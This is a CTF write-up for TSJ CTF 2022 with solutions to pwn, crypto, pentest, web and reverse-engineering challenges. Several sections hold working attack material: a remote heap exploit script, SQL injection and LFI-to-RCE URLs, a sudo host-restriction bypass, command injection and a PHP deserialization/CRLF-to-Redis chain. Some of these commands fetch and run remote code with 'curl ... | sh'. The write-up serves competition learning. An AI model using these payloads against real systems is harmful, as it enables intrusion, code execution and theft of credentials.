# TSJ CTF 2022
 - [TSJ CTF 2022](#tsj-ctf-2022)
   - [pwn](#pwn)
     - [BabyNote](#babynote)
   - [crypto](#crypto)
     - [Futago](#futago)
     - [BabyRSA](#babyrsa)
     - [Top Secret](#top-secret)
     - [Cipher Switching Service](#cipher-switching-service)
     - [Rng  ](#rng)
   - [pentest](#pentest)
     - [Nentau Police Office - 1](#nentau-police-office---1)
     - [Nentau Police Office - 2](#nentau-police-office---2)
   - [web](#web)
     - [Nimja at Nantou](#nimja-at-nantou)
     - [Avatar](#avatar)
   - [rev](#rev)
     - [javascript_vm](#javascript_vm)

## pwn

### BabyNote

```python=
#!/usr/bin/python2

from pwn import *


r = remote('34.81.158.137', 10102)

def create_note(n, l, c):
  r.recvuntil('>')
  r.sendline("1")
  r.recvuntil('Your Name:')
  r.send(n)
  r.recvuntil('Note length:')
  r.sendline(str(l))
  r.recvuntil('Note:')
  r.send(c)

def edit_note(i, n, c):
  r.recvuntil('>')
  r.sendline("3")
  r.recvuntil('ID:')
  r.sendline(str(i))
  print r.recvuntil('Name:')
  r.send(n)
  print r.recvuntil(':')
  r.send(c)

def delete_note(i):
  r.recvuntil('>')
  r.sendline("4")
  r.recvuntil('ID:')
  r.sendline(str(i))

def list_note():
  r.recvuntil('>')
  r.sendline("2")

create_note("n1", 1152, 'a')
create_note("n2", 1152, 'a')
delete_note(0)
create_note("n3", 1152, 'a')
list_note()
r.recvuntil('a')
a = r.recvline()
base = u64('a' + a[:-1] + '\0\0' )

print hex(base)
print a, repr(a)
create_note("o1", 32, 'o1')
create_note("o2", 32, 'o2')

p1 = '6161616161616161616161616161616161616161616161616161616161616161616161616161616131000000000000006e6e6e6e6e6e6e6e6e6e6e6e6e6e6e6e2000000000000000'.decode('hex')
# 614bcc44cb7f
# 287bcc44cb7f
# a005b644cb7f
j = '287bcc44cb7f0000'

p1 += p64(base + 12231)
edit_note(2, 'aaaaaaaaaaaaaaaa\xff', p1)
edit_note(3, 'o2', p64(base - 1459649  -205200))
create_note("ls", 64, 'bash')
list_note()
delete_note(4)
r.interactive()
```

## crypto

### Futago

* level 1: Two $N$s have a non trivial common divisor, which trivialized the factorization
* level 2: Two $N$s are the same, but the $e$s are different. Since two $e$s have gcd 3, we can get $m^3$ by extended Euclidean algorithm. Luckily, $m^3 < N$, allowing us to recover $m$ by taking a cubic root.
* level 3: Assume $N_1 = pq$ and $N_2 = (p+a)(q+b)$. Bruteforce $a$ and $b$ and solve a quadratic equation to factorize both $N$s.

### BabyRSA

In this challenge, we are given a point on elliptic curve
$$E:y^2 = x^3 + px + q \pmod N$$
where $N, p, q$ are parameters of an RSA encrypted flag. By the process of prime generation, $q$ is 512-bit while $p$ is a 1024-bit, and such asymmetry reminds us of coppersmith attack. Specifically, plug in the coordinates of the given elliptic curve point $(x_0, y_0)$, we have
$$px_0 + q = y_0^2 - x_0^3 \pmod N.$$
Multiply by $q$ to eliminate the $p$, we get
$$q^2 = (y_0^2 - x_0^3)q \pmod N.$$
Thus, we get a quadratic equation of $q$. Since $q << N^{\frac{1}{2}}$, we can use standard coppersmith method to solve for $q$, and further compromise the RSA.

### Top Secret

Observing the output of LFSR, it's easy to see that if we transform the output to an element in $GF(2^{128})$, then the output keystream $ks_1, ks_2, \dots$ satisfies
$$ks_i = ks_{i-1} \cdot x^{k}$$
where $k$ is the secret key. The challenge provides $ks_0$, and $ks_1$ is leaked by the observation that a png file has a fixed 16-byte header. Therefore, we can get $ks_2$ by calculating
$$\frac{ks_1^2}{ks_0}$$
without knowing the value of $k$. Similarly, we can recover all output blocks of the keystream, and recover the plaintext.

### Cipher Switching Service

The key observation is that given an Elgamal encryption $(c_1, c_2)$ of a message $m$, we can forge an Elgamal encryption of message $2m$ – it is just simply $(c_1, 2c_2)$. When we switching these two ciphertext back to RSA encryption we get
$$(c_1, c_2) \to x, \quad (c_1, 2c_2) \to x'$$
One might assumes that $x' = 2^ex$. However, there's an exception when $2m \ge p$, where we get $x' = (2m-p)^e \pmod N$ instead of $(2m)^e$. Therefore, we get a MSB-ish oracle, and we can do a binary search to decrypt a Elgamal encrypted message. Out attack goes as follow:
* Using RSA-to-Elgamal, get an Elgamal encryption of the flag.
* Perform the binary search and recover the flag.

### Rng++

Observations:

* All characters of the random string is digits, meaning that it all starts with a '3' in hex.
* $M$ is a power of 2.

We can recover the lowest bytes by setting $M = 256$ and bruteforce all possible states to find the one that matches (the fact that the random string is all digits). and then recover the second lowest bytes and so on. At the end, we recover the states of the RNG, and can predict its output, allowing us to recover the flag.

## pentest

### Nentau Police Office - 1

1. SQL Injection
    - dump schema: `/news.php?id=-1%20union%20select%201,2,group_concat(schema_name),4,5%20from%20information_schema.schemata`
    - dump user: `/news.php?id=-1%20union%20select%201,2,group_concat(concat(uid,0x20,username,0x20,password)),4,5%20from%20users`
        - `1 tsjadmin RRwZriRCF3CoYtbjkF3u`
2. LFI
    - `/adminmanager.php?op=././././users`
    - using [pearcmd.php](https://github.com/w181496/Web-CTF-Cheatsheet#pear) to RCE
        - `/adminmanager.php?+config-create+/&op=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=system($_GET[1]);?>+/var/tmp/a.php`
        - `/adminmanager.php?op=../../../../../../../../var/tmp/a&1=curl%20kaibro.tw|sh`
3. flag permission
    - `flag1.txt` owner is `tsjadmin`
    ```
    www-data@nentaupoliceoffice:/$ cat flag1.txt
    cat flag1.txt
    cat: flag1.txt: Permission denied
    ```
4. find `tsjadmin`'s password
    - `cat /var/www/html/config.php`
    ```php
    ...
    $host = "database";
    $dbname = "announcement";
    $user = "tsjadmin";
    $pass = "tsjadmin@nentaupoliceoffice";
    $db = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
    session_start();
    ...
    ```
5. `su tsjadmin` with password: `tsjadmin@nentaupoliceoffice`
6. `cat /flag1.txt`
    - `TSJ{Just_an_simple_Penetration_Testing_challenge}`

### Nentau Police Office - 2

- `flag2.txt` permission
    - `-r-------- 1 root root 33 Feb 18 07:56 flag2.txt`
- sudoer file
    - `/etc/sudoers.d/sudoers-tsj`
    ```
    tsjadmin workstation=(ALL:ALL)  /bin/cat
    tsjadmin nentaupoliceoffice=(ALL:ALL)  /bin/ls
    ```
- use sudo `-h` option to bypass host limit
    - `sudo -h workstation /bin/cat /flag*`
        - `TSJ{What_use_of_the_-h_option???}`

## web

### Nimja at Nantou

Use `#` to bypass the appended `hello`

```http
POST /hello-from-the-world/get_hello?host=http://localhost/%23 HTTP/1.1
Host: xxx
Connection: close
Content-Length: 0
```

Then get the key `T$J_CTF_15_FUN_>_<_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag`

Use double slash to bypass proxy's limit, and use `{"service":["xxx"]}` to bypass `sanitizeShellString`.


```http
POST /service-info//admin HTTP/1.1
Host: xxx
Connection: close
Content-Length: 114

{"service":["|`curl kaibro.tw/yy|sh`|"],"key": "T$J_CTF_15_FUN_>_<_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag"}
```

`TSJ{HR5_1S_C001_XD_L3ts_gooooo}`

### Avatar



```php
<?php
  namespace Envms\FluentPDO{
    class Structure{
      public $primaryKey;
      function __construct(){
        $this->primaryKey = 'system';
      }
    }
    class Query{
      public $pdo;
      public $structure;
      function __construct($struct){
        $this->pdo = null;
        $this->structure = $struct;
      }
    }
    class Regex{
    }
  }

  namespace Envms\FluentPDO\Queries{
    class Select{
      public $fluent;
      public $clauses;
      public $statements;
      public $regex;
      function __construct($query, $clauses, $statements, $regex){
        $this->fluent = $query;
        $this->clauses = $clauses;
        $this->statements = $statements;
        $this->regex = $regex;
      }

    }
  }

  namespace {
    $regex = new Envms\FluentPDO\Regex();
    $struct = new Envms\FluentPDO\Structure();
    $query = new Envms\FluentPDO\Query($struct);

    $c_clauses = [];
    $c_statements = ['SELECT'=>['x:x'], 'FROM'=>'curl 3419192343|sh'];
    $common= new Envms\FluentPDO\Queries\Select($query, $c_clauses, $c_statements, $regex);

    $n_clauses = ['x' => [$common, 'getQuery']];
    $n_statements = ['x' => True];
    $name= new Envms\FluentPDO\Queries\Select(null, $n_clauses, $n_statements, null);

    $name= unserialize(serialize($name));
    echo 'url=http://ginoah.tw:8080/a.b%250d%250aSET%2520PHPREDIS_SESSION:7ae84e5c2a2be644c1fdf1b1eeb7d0df%2520%2527username|'.urlencode(urlencode(serialize($name)))."%2527%250d%250aHost:%2520xx\n";
    die();
  }

?>
```


```http
POST /update.php?mode=url HTTP/1.1
Host: 34.81.158.137:5566
Content-Length: 1386
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7ae84e5c2a2be644c1fdf1b1eeb7d0df
Connection: close

url=http://ginoah.tw:8080/a.b%250d%250aSET%2520PHPREDIS_SESSION:7ae84e5c2a2be644c1fdf1b1eeb7d0df%2520%2527username|O%253A30%253A%2522Envms%255CFluentPDO%255CQueries%255CSelect%2522%253A4%253A%257Bs%253A6%253A%2522fluent%2522%253BN%253Bs%253A7%253A%2522clauses%2522%253Ba%253A1%253A%257Bs%253A1%253A%2522x%2522%253Ba%253A2%253A%257Bi%253A0%253BO%253A30%253A%2522Envms%255CFluentPDO%255CQueries%255CSelect%2522%253A4%253A%257Bs%253A6%253A%2522fluent%2522%253BO%253A21%253A%2522Envms%255CFluentPDO%255CQuery%2522%253A2%253A%257Bs%253A3%253A%2522pdo%2522%253BN%253Bs%253A9%253A%2522structure%2522%253BO%253A25%253A%2522Envms%255CFluentPDO%255CStructure%2522%253A1%253A%257Bs%253A10%253A%2522primaryKey%2522%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522clauses%2522%253Ba%253A0%253A%257B%257Ds%253A10%253A%2522statements%2522%253Ba%253A2%253A%257Bs%253A6%253A%2522SELECT%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522x%253Ax%2522%253B%257Ds%253A4%253A%2522FROM%2522%253Bs%253A18%253A%2522curl%2B3419192343%257Csh%2522%253B%257Ds%253A5%253A%2522regex%2522%253BO%253A21%253A%2522Envms%255CFluentPDO%255CRegex%2522%253A0%253A%257B%257D%257Di%253A1%253Bs%253A8%253A%2522getQuery%2522%253B%257D%257Ds%253A10%253A%2522statements%2522%253Ba%253A1%253A%257Bs%253A1%253A%2522x%2522%253Bb%253A1%253B%257Ds%253A5%253A%2522regex%2522%253BN%253B%257D%2527%250d%250aHost:%2520xx
```


```http
Location: http://redis:6379/
```

## rev

### javascript_vm

* test

```
127 127
148 148
212 178
242 182
247 182
175 169
152 148
186 187
158 156
215 146
133 130
179 133
251 216
221 175
207 146
183 107
230 156
94 91
3 202
175 125
216 191
179 179
195 126
183 123
190 144
162 116
189 117
81 81
170 124
152 152
209 205
164 118
196 141
160 157
98 92
97 97
87 81
145 139
88 23
157 158
248 202
197 144
175 116
136 130
180 125
186 123
233 187
175 105
223 158
169 166
185 139
217 149
```


* test2

```
127 130
148 171
212 178
242 250
247 244
175 173
152 155
186 236
158 210
215 204
133 149
179 138
251 215
221 226
207 194
183 138
230 158
94 115
3 2
175 186
216 192
179 207
195 193
183 143
190 152
162 171
189 187
81 144
170 141
152 158
209 9
164 187
196 171
160 216
98 157
97 118
87 133
145 168
88 48
157 229
248 228
197 162
175 138
136 180
180 178
186 187
233 253
175 132
223 174
169 223
185 212
217 221
```

* sol.py

```python=
import string

f = open('test')


flag = []

a = []

b = []

for i in f.readlines():
  c,d = i.split()
  flag.append(int(c))
  a.append(int(d))
  print int(c),d

f = open('test2')

for i in f.readlines():
  c,d = i.split()
  b.append(int(d))


ans = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP"

print len(ans)

index = []
out = ['0'] * 52

for i in range(51):
  j = b[i] - a[i]
  ii = (j+1) % 256
  k = chr(ord('0') + ii)
  print k
  ii = ans.find(k)
  enc = flag[i]
  q = a[i]
  t = enc - q
  print ii
  print chr((ord('1')+t)%256)
  out[ii] = chr((ord('1')+t)%256)

print "".join(out)
print flag,a,b
```
